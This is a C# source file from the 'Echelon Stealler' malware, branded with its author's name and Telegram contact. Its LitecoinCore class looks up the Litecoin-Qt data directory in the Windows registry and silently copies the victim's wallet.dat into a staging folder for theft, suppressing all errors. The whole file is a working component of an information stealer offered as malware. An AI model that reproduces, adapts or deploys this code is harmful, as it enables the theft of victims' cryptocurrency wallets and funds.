///////////////////////////////////////////////////////
////Echelon Stealler, C# Malware Systems by MadСod ////
///////////////////Telegram: @madcod///////////////////
///////////////////////////////////////////////////////


using Microsoft.Win32;
using System.IO;

namespace Echelon
{
    class LitecoinCore
    {
        public static int count = 0;
        public static void LitecStr(string directorypath) 
        {
            try
            {
                using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Litecoin").OpenSubKey("Litecoin-Qt"))
                    try
                    {
                        Directory.CreateDirectory(directorypath + "\\Wallets\\LitecoinCore\\");
                        File.Copy(registryKey.GetValue("strDataDir").ToString() + "\\wallet.dat", directorypath + "\\LitecoinCore\\wallet.dat");
                        count++;
                        StartWallets.count++;
                    }
                    catch 
                    {
                    }
            }
            catch 
            {
            }
        }
    }
}
